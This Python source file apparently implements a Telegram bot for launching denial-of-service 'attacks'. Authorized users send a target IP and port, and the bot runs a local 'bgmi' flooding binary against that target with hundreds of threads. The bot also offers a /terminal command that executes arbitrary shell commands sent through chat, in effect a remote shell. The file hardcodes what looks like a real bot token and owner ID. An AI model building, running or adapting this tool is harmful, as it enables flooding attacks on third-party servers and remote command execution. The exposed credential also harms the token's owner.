import os
import asyncio
import socket
import psutil
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters

# Bot setup
TELEGRAM_BOT_TOKEN = '8146585403:AAFJYRvEErZ9NuZ9ufyf8cvXyWOzs0lIB4k'
OWNER_USER_ID = 6479495033
authorized_users = {OWNER_USER_ID}

# Default config
default_duration = 60
default_threads = 500
running_attacks = {}

# Allowed groups only (modifable)
ALLOWED_GROUP_IDS = set([-1002491572572])  # Add your group IDs here

def is_allowed_chat(update: Update) -> bool:
    chat = update.effective_chat
    return chat.type in ['group', 'supergroup'] and chat.id in ALLOWED_GROUP_IDS

async def deny_if_not_allowed(update: Update, context: CallbackContext) -> bool:
    if not is_allowed_chat(update):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Not authorized to use here.")
        return True
    return False

# Commands
async def start(update: Update, context: CallbackContext):
    if await deny_if_not_allowed(update, context): return

    chat_id = update.effective_chat.id
    keyboard = [[ "/start", "/attack", "/stop" ]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Commands:*\n"
        "`/attack` - Launch attack (IP and port will be requested)\n"
        "`/stop` - Stop your running attack\n"
        "`/terminal <cmd>` - Run command (owner only)\n"
        "`/adduser <id>` - Add user (owner only)\n"
        "`/removeuser <id>` - Remove user (owner only)\n"
        "`/setduration <sec>` - Max duration (owner only)\n"
        "`/setthreads <cnt>` - Max threads (owner only)\n"
        "`/addgroup <id>` - Add allowed group (owner only)\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown', reply_markup=reply_markup)

async def run_attack(chat_id, user_id, ip, port, duration, threads, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} {threads}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_attacks[user_id] = process
        try:
            await asyncio.wait_for(process.communicate(), timeout=duration + 5)
        except asyncio.TimeoutError:
            process.kill()
            await process.wait()
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during attack: {str(e)}*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed!*", parse_mode='Markdown')
    finally:
        running_attacks.pop(user_id, None)

async def attack(update: Update, context: CallbackContext):
    if await deny_if_not_allowed(update, context): return

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id not in authorized_users:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text="Please provide the target IP and port in the following format: `<ip> <port>`")

async def handle_attack_input(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id not in authorized_users:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    args = update.message.text.split()
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide both IP and port in the format: <ip> <port>*", parse_mode='Markdown')
        return

    ip, port = args
    duration = default_duration
    threads = default_threads

    await context.bot.send_message(
        chat_id=chat_id,
        text=(f"*⚔️ Attack Started! ⚔️*\n"
              f"*🎯 Target: {ip}:{port}*\n"
              f"*🕒 Duration: {duration} seconds*\n"
              f"*🔁 Threads: {threads}*"),
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(chat_id, user_id, ip, port, duration, threads, context))

async def stop_attack(update: Update, context: CallbackContext):
    if await deny_if_not_allowed(update, context): return

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    process = running_attacks.get(user_id)
    if process and process.returncode is None:
        try:
            parent = psutil.Process(process.pid)
            for child in parent.children(recursive=True):
                child.kill()
            parent.kill()
            await context.bot.send_message(chat_id=chat_id, text="*🛑 Attack forcefully stopped.*", parse_mode='Markdown')
        except Exception as e:
            await context.bot.send_message(chat_id=chat_id, text=f"*❌ Error stopping attack:* `{str(e)}`", parse_mode='Markdown')
        finally:
            running_attacks.pop(user_id, None)
    else:
        await context.bot.send_message(chat_id=chat_id, text="*ℹ️ No running attack to stop.*", parse_mode='Markdown')

# Admin commands
async def set_duration(update: Update, context: CallbackContext):
    global default_duration
    if await deny_if_not_allowed(update, context): return
    if update.effective_user.id != OWNER_USER_ID:
        return
    if not context.args or not context.args[0].isdigit():
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /setduration <seconds>*", parse_mode='Markdown')
        return
    default_duration = int(context.args[0])
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Max duration set to {default_duration} seconds.*", parse_mode='Markdown')

async def set_threads(update: Update, context: CallbackContext):
    global default_threads
    if await deny_if_not_allowed(update, context): return
    if update.effective_user.id != OWNER_USER_ID:
        return
    if not context.args or not context.args[0].isdigit():
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /setthreads <count>*", parse_mode='Markdown')
        return
    default_threads = int(context.args[0])
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Max threads set to {default_threads}.*", parse_mode='Markdown')

async def add_user(update: Update, context: CallbackContext):
    if await deny_if_not_allowed(update, context): return
    if update.effective_user.id != OWNER_USER_ID:
        return
    if not context.args or not context.args[0].isdigit():
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /adduser <user_id>*", parse_mode='Markdown')
        return
    new_user_id = int(context.args[0])
    authorized_users.add(new_user_id)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User `{new_user_id}` added.*", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    if await deny_if_not_allowed(update, context): return
    if update.effective_user.id != OWNER_USER_ID:
        return
    if not context.args or not context.args[0].isdigit():
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /removeuser <user_id>*", parse_mode='Markdown')
        return
    remove_id = int(context.args[0])
    if remove_id in authorized_users:
        authorized_users.remove(remove_id)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User `{remove_id}` removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ User not found.*", parse_mode='Markdown')

async def add_group(update: Update, context: CallbackContext):
    if await deny_if_not_allowed(update, context): return
    if update.effective_user.id != OWNER_USER_ID:
        return
    if not context.args or not context.args[0].startswith("-100"):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /addgroup <group_id>*", parse_mode='Markdown')
        return
    new_group_id = int(context.args[0])
    ALLOWED_GROUP_IDS.add(new_group_id)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Group `{new_group_id}` added to allowed list.*", parse_mode='Markdown')

async def terminal(update: Update, context: CallbackContext):
    if await deny_if_not_allowed(update, context): return
    if update.effective_user.id != OWNER_USER_ID:
        return
    if not context.args:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /terminal <command>*", parse_mode='Markdown')
        return
    command = " ".join(context.args)
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        output = stdout.decode().strip() + "\n" + stderr.decode().strip()
        if not output.strip():
            output = "✅ Command executed successfully, no output."
        if len(output) > 4000:
            output = output[:4000] + "\n... (truncated)"
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"```\n{output}\n```", parse_mode='Markdown')
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*❌ Error:* `{str(e)}`", parse_mode='Markdown')

# Block everything else in private/unauthorized
async def block_unauthorized(update: Update, context: CallbackContext):
    if not is_allowed_chat(update):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Not authorized to use this bot here.")

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(CommandHandler("terminal", terminal))
    application.add_handler(CommandHandler("setduration", set_duration))
    application.add_handler(CommandHandler("setthreads", set_threads))
    application.add_handler(CommandHandler("adduser", add_user))
    application.add_handler(CommandHandler("removeuser", remove_user))
    application.add_handler(CommandHandler("addgroup", add_group))

    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_attack_input))
    application.add_handler(MessageHandler(filters.ALL, block_unauthorized))

    application.run_polling()

if __name__ == '__main__':
    main()
